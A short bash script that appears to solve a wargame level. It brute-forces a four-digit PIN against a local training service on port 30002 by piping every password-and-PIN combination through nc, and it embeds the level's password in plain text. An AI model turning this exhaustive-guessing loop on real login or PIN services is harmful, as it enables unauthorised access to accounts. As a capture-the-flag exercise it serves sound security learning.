#!/bin/bash

PASS_FILE_PATH=/tmp/bandit24lu/bandit24_pass
RESULT_FILE_PATH=/tmp/bandit24lu/bandit24_result
PASS=UoMYTrfrBFHyQXmg6gzctqAwOmw1Ioh

for PIN in {0000..9999}
do
              echo $PASS $PIN >> $PASS_FILE_PATH
                        done

cat $PASS_FILE_PATH | nc localhost 30002 > $RESULT_FILE_PATH 2>&1

sort -u $RESULT_FILE_PATH
